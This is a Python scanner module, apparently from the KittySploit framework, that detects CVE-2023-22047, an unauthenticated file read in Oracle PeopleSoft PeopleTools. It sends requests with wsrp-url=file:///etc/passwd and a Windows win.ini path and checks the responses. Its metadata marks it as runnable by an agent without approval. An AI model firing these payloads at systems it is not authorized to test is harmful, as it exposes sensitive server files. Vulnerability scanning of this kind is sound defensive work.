#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Vulnerability in the PeopleSoft Enterprise PeopleTools product of Oracle PeopleSoft (component- Portal)."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Oracle Peoplesoft - Unauthenticated File Read Detection',
        'description': 'Vulnerability in the PeopleSoft Enterprise PeopleTools product of Oracle PeopleSoft (component- Portal). Supported versions that are affected are 8.59 and 8.60. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise PeopleSoft Enterprise PeopleTools. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all PeopleSoft Enterprise PeopleTools accessible data.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'oracle', 'peoplesoft', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-22047',
            'https://x.com/tuo4n8/status/1907279143517266286',
        ],
        'cve': 'CVE-2023-22047',
    }

    def run(self):
        for path in ('/RP?wsrp-url=file:///etc/passwd', '/RP?wsrp-url=file:///c:\\windows\\win.ini'):
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
            ctype_any = ('content/unknown',)
            body_regexes = ('root:.*:0:0:', 'bit app support',)
            if (any(m in content_type for m in ctype_any)) and (any(re.search(rx, body) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason='Oracle Peoplesoft - Unauthenticated File Read detected',
                    path=path,
                )
                return True
        return False

